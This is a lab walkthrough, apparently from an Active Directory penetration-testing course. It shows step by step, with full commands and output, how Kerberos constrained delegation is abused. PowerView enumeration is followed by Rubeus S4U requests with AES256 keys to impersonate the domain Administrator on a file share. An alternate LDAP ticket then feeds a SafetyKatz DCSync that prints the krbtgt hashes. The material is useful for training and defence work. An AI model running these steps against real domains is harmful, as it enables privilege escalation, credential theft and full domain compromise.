# Learning Objetive 16

* Enumerate users in the domain for whom Constrained Delegation is enabled.
  * For such a user, request a TGT from the DC and obtain a TGS for the service to which delegation is configured.
  * Pass the ticket and access the service as DA.
* Enumerate computer accounts in the domain for which Constrained Delegation is enabled.
  * For such a user, request a TGT from the DC.
  * Obtain an alternate TGS for LDAP service on the target machine.
  * Use the TGS for executing DCSync attack.

***

To enumerate users with constrained delegation we can use PowerView.

Run the below command from a PowerShell session started using Invisi-Shell:

## Enumerate Users with Constrained Delegation

```
C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat
. C:\AD\Tools\PowerView.ps1
Get-DomainUser -TrustedToAuth
```

<figure><img src="../../../../.gitbook/assets/image (1441).png" alt=""><figcaption></figcaption></figure>

> websvc → Tiene Constrained Delegation hacia CIFS/dcorp-mssql.dollarcorp.moneycorp.local

And we already have secrets/tgt of websvc from dcorp-admisrv machine. We can use Rubeus to abuse that.

### Abuse Constrained Delegation using websvc with Rubeus

In the below command, we request a TGS for websvc as the Domain Administrator - Administrator. Then the TGS used to access the service specified in the `/msdsspn` parameter (which is filesystem on dcorp-mssql):

> * Pide un TGT para websvc
> * Hace **S4U2Self** → se hace pasar por Administrator
> * Hace **S4U2Proxy** → obtiene un ticket para el servicio CIFS en dcorp-mssql
> * Usa /msdsspn para especifcar el path
> * Inyecta el ticket con /ptt

```
C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL" /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

v2.2.1

[*] Action: S4U

[*] Using aes256_cts_hmac_sha1 hash: 2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7
[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\websvc'
[*] Using domain controller: 172.16.2.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFSjCCBUagAwIBBaED [snip]

[*] Action: S4U

[*] Building S4U2self request for: 'websvc@DOLLARCORP.MONEYCORP.LOCAL'
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[*] Sending S4U2self request to 172.16.2.1:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'websvc@DOLLARCORP.MONEYCORP.LOCAL'
[*] base64(ticket.kirbi):

      doIGHDCCBhigAwIBBaED [snip]

[+] Ticket successfully imported!
[*] Impersonating user 'Administrator' to target SPN 'CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL'
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[*] Building S4U2proxy request for service: 'CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL'
[*] Sending S4U2proxy request
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL':

      doIHYzCCB1+gAwIBBaED [snip]

[+] Ticket successfully imported!
```

Check if the TGS is injected:

```
C:\AD\Tools> klist

Current LogonId is 0:0x1184e6d

Cached Tickets: (1)

#0>     Client: Administrator @ DOLLARCORP.MONEYCORP.LOCAL
        Server: CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
[snip]
```

Try accessing filesystem on dcorp-mssql:

```
C:\AD\Tools> dir \\dcorp-mssql.dollarcorp.moneycorp.local\c$

Volume in drive \\dcorp-mssql.dollarcorp.moneycorp.local\c$ has no label.
 Volume Serial Number is 98C0-23AE

 Directory of \\dcorp-mssql.dollarcorp.moneycorp.local\c$

05/08/2021  12:15 AM    <DIR>          PerfLogs
11/14/2022  04:44 AM    <DIR>          Program Files
11/14/2022  04:43 AM    <DIR>          Program Files (x86)
11/15/2022  08:06 AM    <DIR>          Transcripts
11/15/2022  01:48 AM    <DIR>          Users
11/11/2022  05:22 AM    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)   6,214,402,048 bytes free
```

For the next task, enumerate the computer accounts with coenstrained delegation enabled using PowerView:

```
PS C:\AD\Tools> Get-DomainComputer -TrustedToAuth

pwdlastset                    : 11/11/2022 11:16:12 PM
logoncount                    : 60
badpasswordtime               : 12/31/1600 4:00:00 PM
distinguishedname             : CN=DCORP-ADMINSRV,OU=Applocked,DC=dollarcorp,DC=moneycorp,DC=local
objectclass                   : {top, person, organizationalPerson, user...}
lastlogontimestamp            : 2/24/2023 12:45:04 AM
whencreated                   : 11/12/2022 7:16:12 AM
samaccountname                : DCORP-ADMINSRV$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
whenchanged                   : 3/3/2023 10:39:12 AM
accountexpires                : NEVER
countrycode                   : 0
operatingsystem               : Windows Server 2022 Datacenter
instancetype                  : 4
useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT, TRUSTED_TO_AUTH_FOR_DELEGATION
objectguid                    : 2e036483-7f45-4416-8a62-893618556370
operatingsystemversion        : 10.0 (20348)
lastlogoff                    : 12/31/1600 4:00:00 PM
msds-allowedtodelegateto      : {TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL, TIME/dcorp-DC}
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
dscorepropagationdata         : {11/15/2022 4:16:45 AM, 1/1/1601 12:00:00 AM}
serviceprincipalname          : {WSMAN/dcorp-adminsrv, WSMAN/dcorp-adminsrv.dollarcorp.moneycorp.local, TERMSRV/DCORP-ADMINSRV, TERMSRV/dcorp-adminsrv.dollarcorp.moneycorp.local...}
usncreated                    : 13891
usnchanged                    : 119138
lastlogon                     : 3/3/2023 9:31:15 AM
badpwdcount                   : 0
cn                            : DCORP-ADMINSRV
msds-supportedencryptiontypes : 28
objectsid                     : S-1-5-21-719815819-3726368948-3917688648-1105

[snip]
```

### Abuse Constrained Delegation using dcorp-adminsrv$ with Rubeus <a href="#abuse-constrained-delegation-using-dcorp-adminsrv-with-rubeus" id="abuse-constrained-delegation-using-dcorp-adminsrv-with-rubeus"></a>

We have the AES keys of dcorp-adminsrv$ from dcorp-adminsrv machine. Run the below command from an elevated command prompt as SafetyKatz, that we will use for DCSync, would need that:

> dcorp-adminsrv$: e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51

```
C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-adminsrv$ /aes256:e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51 /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  V2.2.1

[*] Action: S4U

[*] Using aes256_cts_hmac_sha1 hash: e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51
[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\dcorp-adminsrv$'
[*] Using domain controller: 172.16.2.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

[snip]

[*] Impersonating user 'Administrator' to target SPN 'time/dcorp-dc.dollarcorp.moneycorp.LOCAL'
[*]   Final ticket will be for the alternate service 'ldap'
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[*] Building S4U2proxy request for service: 'time/dcorp-dc.dollarcorp.moneycorp.LOCAL'
[*] Sending S4U2proxy request
[+] S4U2proxy success!
[*] Substituting alternative service name 'ldap'
[*] base64(ticket.kirbi) for SPN 'ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL': [snip]
[+] Ticket successfully imported!
```

Run the below command to abuse the LDAP ticket:

```
C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"

[snip]

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/11/2022 9:59:41 PM
Object Security ID   : S-1-5-21-719815819-3726368948-3917688648-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 4e9815869d2090ccfca61c1fe0d23986
    ntlm- 0: 4e9815869d2090ccfca61c1fe0d23986
    lm  - 0: ea03581a1268674a828bde6ab09db837

[snip]
```
